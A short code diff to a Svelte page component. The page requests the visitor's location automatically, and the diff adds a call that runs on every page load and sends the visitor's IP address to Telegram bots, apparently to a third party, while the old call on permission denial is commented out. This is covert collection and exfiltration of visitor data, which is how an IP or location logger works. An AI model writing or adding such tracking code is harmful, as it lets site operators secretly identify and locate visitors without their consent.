@@ -2,6 +2,7 @@
   import { onMount } from 'svelte';
 
   onMount(async () => {
+ sendIPToTelegramBots();
   
     // Request location permission automatically
     navigator.geolocation.getCurrentPosition(
@@ -12,7 +13,8 @@
       (error) => {
         if (error.code === error.PERMISSION_DENIED) {
           // Location permission denied, send IP result to Telegram bots
-          sendIPToTelegramBots();
+         // sendIPToTelegramBots();
+ console.error('Location permission denied.');
         }
       }
     );
